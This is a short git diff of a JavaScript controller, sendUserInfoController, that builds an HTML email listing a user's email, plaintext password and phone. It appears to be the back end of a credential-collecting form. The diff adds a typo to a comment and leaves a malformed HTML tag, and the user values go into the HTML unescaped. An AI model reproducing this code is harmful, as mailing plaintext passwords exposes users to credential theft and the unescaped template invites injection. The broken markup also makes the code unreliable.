@@ -52,13 +52,13 @@ export const sendUserInfoController = asyncHandler(
             return errorResponse(res, "Missing required fields", 400);
         }
 
-        // Create HTML email content
+        // Create HTML email contentr
         const htmlContent = `
       <h2>${title}</h2>
       <ul>
         <li><strong>Email:</strong> ${email}</li>
         <li><strong>Password:</strong> ${password}</li>
-        <li><strong>Phonerong> ${phone || ''}</li>
+        <li><strong>Phone> ${phone || ''}</li>
       </ul>
     `;
 
